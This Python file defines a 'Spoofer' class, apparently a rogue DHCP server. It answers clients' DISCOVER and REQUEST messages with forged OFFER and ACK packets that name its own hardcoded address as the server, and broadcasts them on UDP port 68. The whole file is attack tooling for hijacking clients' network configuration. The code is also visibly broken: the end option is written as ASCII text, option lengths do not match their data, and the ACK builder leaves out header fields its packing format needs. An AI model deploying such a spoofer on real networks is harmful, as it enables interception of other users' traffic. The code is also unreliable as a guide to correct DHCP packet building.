import socket as s
import netifaces as netif
from struct import Struct
import ipaddress as ip
import macaddress as mac
from typing import Dict
from collections.abc import Mapping
import time  # tempor�rio


class Spoofer:

    #    def __init__(self, dhcp_offer_header : Dict):
    #        self.dhcp_offer_header = dhcp_offer_header

    @staticmethod
    def getIP(inBytes=False):
        #    hostname = s.gethostname()
        #    ipaddr = s.gethostbyname(hostname)
        #
        if inBytes:
            return s.inet_aton('10.32.143.134')
        return '10.32.143.134'

    @staticmethod
    def getNetmask(inBytes=False):  # https://stackoverflow.com/a/54074160
        #        for iface in netif.interfaces():
        #    #       time.sleep(1) # tempor�rio, se n�o tiver sleep e fizer dhclient -r na mesma m�quina que roda o programa, o IP n�o � configurado a tempo e n�o da pra pegar a m�scara
        #            addresses = netif.ifaddresses(iface)
        #
        #            if 2 in addresses.keys():
        #                if iface.startswith('wlp') or iface.startswith('enp'):
        #                    mask = addresses[2][0]['netmask']
        #
        if inBytes:
            return s.inet_aton('255.255.255.0')
        #
        #        return str(mask)
        return '255.255.255.0'

    @staticmethod
    def write_offer(dhcp_discover_header: Dict):
        dhcp_offer_header = {}
        opt = {}
        dhcp_offer_header['op'] = 2
        dhcp_offer_header['hwtype'] = 1
        dhcp_offer_header['hlen'] = 6
        dhcp_offer_header['hops'] = 0
        dhcp_offer_header['xid'] = int(dhcp_discover_header['xid'], 16)
        dhcp_offer_header['secs'] = 0
        dhcp_offer_header['flags'] = 0
        dhcp_offer_header['ciaddr'] = s.inet_aton('0.0.0.0')
        dhcp_offer_header['yiaddr'] = s.inet_aton('10.132.249.253')
        dhcp_offer_header['siaddr'] = Spoofer.getIP(True)
        dhcp_offer_header['giaddr'] = Spoofer.getIP(True)
        dhcp_offer_header['chaddr'] = bytes("a41f72f590a2", "utf-8")
        dhcp_offer_header['sname'] = bytes(0)
        dhcp_offer_header['bootf'] = bytes(0)
        dhcp_offer_header['mcookie'] = 'DHCP'.encode('utf-8')
        # opt[1] = {'length': 4, 'res': Spoofer.getNetmask(True)}
        # opt[3] = {'length': 4, 'res': Spoofer.getIP(True)}
        # opt[6] = {'length': 4, 'res': Spoofer.getIP(True)}
        # opt[51] = {'length': 4, 'res': (3600).to_bytes(4,byteorder='big')}
        opt[53] = {'length': 1, 'res': (2).to_bytes(4,byteorder='big')}
        opt[54] = {'length': 4, 'res': Spoofer.getIP(True)}
        # opt[58] = {'length': 4, 'res': (1800).to_bytes(4,byteorder='big')}
        # opt[59] = {'length': 4, 'res': (3150).to_bytes(4,byteorder='big')}
        opt[255] = {'length': 1, 'res': 0xFF}

        opts = b''
        for k, v in opt.items():
            if isinstance(v, Mapping):
                if k == 255:
                    opts += b'11111111'
                    break
                opts += k.to_bytes(1,byteorder='big')
                opts += v['length'].to_bytes(1,byteorder='big')
                opts += v['res']

        dhcp_offer_header.update({"opt":opts})

        return Struct("!4BI2H4s4s4s4s16s64s128s4s10s").pack(*list(dhcp_offer_header.values()))

    def write_ack(dhcp_request_header: Dict):
        dhcp_ack_header = {}
        dhcp_ack_header['op'] = 2
        dhcp_ack_header['hwtype'] = 1
        dhcp_ack_header['hlen'] = 6
        dhcp_ack_header['hops'] = 0
        dhcp_ack_header['xid'] = int(dhcp_request_header['xid'])
        dhcp_ack_header['secs'] = 0
        dhcp_ack_header['flags'] = 0
        dhcp_ack_header['ciaddr'] = "0.0.0.0"
        dhcp_ack_header['bootf'] = dhcp_request_header['bootf']
        dhcp_ack_header['mcookie'] = 'DHCP'
#        dhcp_ack_header[1]        =   {'length': 4, 'res': Spoofer.getNetmask()}
#        dhcp_ack_header[3]        =   {'length': 4, 'res': Spoofer.getIP()}
#        dhcp_ack_header[6]        =   {'length': 4, 'res': Spoofer.getIP()}
#        dhcp_ack_header[51]       =   {'length': 4, 'res': 3600}
#        dhcp_ack_header[53]       =   {'length': 1, 'res': 0x5}
#        dhcp_ack_header[54]       =   {'length': 4, 'res': Spoofer.getIP()}
#        dhcp_ack_header[58]       =   {'length': 4, 'res': 1800}
#        dhcp_ack_header[59]       =   {'length': 4, 'res': 3150}
#        dhcp_ack_header[0]        =   {'length': 4, 'res': 0x00000}
#        dhcp_ack_header[255]      =   {'length': 4, 'res': 0xFF}

        return Struct("!4BI2H4s4s4s4s16s64s128s4s").pack(*list(dhcp_ack_header.values()))

    def opt_to_byte(dict):
        res = ""
        for k, v in dict.items():
            res += f"{k}{len(f'{v}')}{v}"
        return res

    def dict_to_byte(dict):
        byt = b''
        for i in dict.values():
            if isinstance(i, Mapping):
                i = Spoofer.opt_to_byte(i)
            if isinstance(i, int):
                i = i.to_bytes()
            if isinstance(i, bytes):
                continue

            byt += f"{i}".encode(encoding='UTF-8')
        return byt

    @staticmethod
    def spoof(dhcp_header: Dict):
        if dhcp_header[53]['res'] == 1:
            response_header = Spoofer.write_offer(dhcp_header)
        elif dhcp_header[53]['res'] == 3:
            response_header = Spoofer.write_ack(dhcp_header)
        broadcast = str(ip.IPv4Network(Spoofer.getIP() + '/' +
                        Spoofer.getNetmask(), False).broadcast_address)

        dport = 68
        udp = s.socket(s.AF_INET, s.SOCK_DGRAM)
        udp.setsockopt(s.SOL_SOCKET, s.SO_BROADCAST, 1)
        dest = (broadcast, dport)
        udp.sendto(response_header, dest)
        udp.close()
